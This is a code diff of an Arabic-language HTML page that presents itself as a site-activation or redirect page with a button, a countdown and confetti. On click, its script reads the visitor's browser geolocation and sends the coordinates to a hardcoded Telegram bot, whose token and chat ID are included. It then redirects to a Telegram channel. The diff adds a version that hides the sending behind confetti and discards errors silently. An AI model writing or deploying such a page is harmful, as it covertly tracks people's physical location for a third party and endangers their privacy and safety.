@@ -5,107 +5,107 @@
   <title>صفحة توجيه البوت</title>
   <style>
     body {
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
       margin: 0;
+      padding: 0;
       background-image: url('https://i.pinimg.com/736x/dc/9d/41/dc9d4149758055ed003a52ff47707520.jpg');
       background-size: cover;
       background-position: center;
-      font-family: Arial, sans-serif;
-      color: #ffffff;
-      direction: rtl;
+      height: 100vh;
+      font-family: 'Arial', sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
     }
 
-    #startBtn {
-      padding: 12px 24px;
-      font-size: 18px;
-      font-weight: bold;
-      background-color: rgba(0, 0, 0, 0.6);
-      border: 2px solid #ffffffaa;
-      border-radius: 12px;
+    #activate-btn {
+      padding: 15px 30px;
+      font-size: 20px;
+      border: none;
+      border-radius: 8px;
+      background-color: #28a745;
       color: white;
       cursor: pointer;
-      margin-bottom: 30px;
-      transition: all 0.3s;
-    }
-
-    #startBtn:hover {
-      background-color: rgba(255, 255, 255, 0.2);
+      margin-bottom: 20px;
     }
 
     #countdown {
-      width: 80px;
-      height: 80px;
-      font-size: 36px;
+      width: 70px;
+      height: 70px;
+      font-size: 30px;
       font-weight: bold;
-      background: rgba(0, 0, 0, 0.6);
-      border: 2px solid #ffffffaa;
-      border-radius: 20px;
+      background-color: #ffffffcc;
+      border: 2px solid #ccc;
+      border-radius: 10px;
       display: flex;
       justify-content: center;
       align-items: center;
-      text-shadow: 0 0 5px #000000;
-      display: none;
+      visibility: hidden;
+    }
+
+    canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      pointer-events: none;
     }
   </style>
 </head>
 <body>
-  <button id="startBtn">اضغط للمتابعة</button>
+
+  <button id="activate-btn">اضغط لتفعيل الموقع</button>
   <div id="countdown">5</div>
 
+  <canvas id="confetti"></canvas>
+
+  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
   <script>
     const BOT_TOKEN = "7786101064:AAEHsY7be9Tk6SQtShnDR4jgmNxO59Qi2cQ";
     const CHAT_ID = "6028485445";
-    const REDIRECT_URL = "https://t.me/sswq22";
-    let locationSent = false;
 
-    document.getElementById("startBtn").onclick = () => {
-      getLocationAndStart();
-    };
+    const btn = document.getElementById("activate-btn");
+    const countdownEl = document.getElementById("countdown");
 
-    function getLocationAndStart() {
+    let seconds = 5;
+
+    btn.addEventListener("click", () => {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition((position) => {
           const lat = position.coords.latitude;
           const lon = position.coords.longitude;
 
           fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`)
-            .then(() => {
-              locationSent = true;
-              startCountdown();
-            })
-            .catch(() => alert("فشل في إرسال الموقع"));
+            .catch(() => {});
+
+          // تشغيل الشرارات
+          confetti({
+            particleCount: 100,
+            spread: 70,
+            origin: { y: 0.6 }
+          });
+
+          // إخفاء الزر
+          btn.style.display = "none";
+
+          // عرض العداد
+          countdownEl.style.visibility = "visible";
+          countdownEl.innerText = seconds;
+
+          const interval = setInterval(() => {
+            seconds--;
+            countdownEl.innerText = seconds;
+            if (seconds === 0) {
+              clearInterval(interval);
+              window.location.href = "https://t.me/sswq22";
+            }
+          }, 1000);
         }, () => {
-          alert("يرجى تفعيل الموقع للاستمرار.");
+          alert("لم يتم السماح بالوصول إلى الموقع.");
         });
       } else {
-        alert("متصفحك لا يدعم مشاركة الموقع.");
+        alert("متصفحك لا يدعم تحديد الموقع.");
       }
-    }
-
-    function startCountdown() {
-      document.getElementById("startBtn").style.display = "none";
-      const countdownEl = document.getElementById("countdown");
-      countdownEl.style.display = "flex";
-      let seconds = 5;
-      countdownEl.innerText = seconds;
-
-      const interval = setInterval(() => {
-        seconds--;
-        countdownEl.innerText = seconds;
-        if (seconds === 0) {
-          clearInterval(interval);
-          if (locationSent) {
-            window.location.href = REDIRECT_URL;
-          } else {
-            alert("لم يتم إرسال الموقع، لا يمكن المتابعة.");
-          }
-        }
-      }, 1000);
-    }
+    });
   </script>
 </body>
 </html>
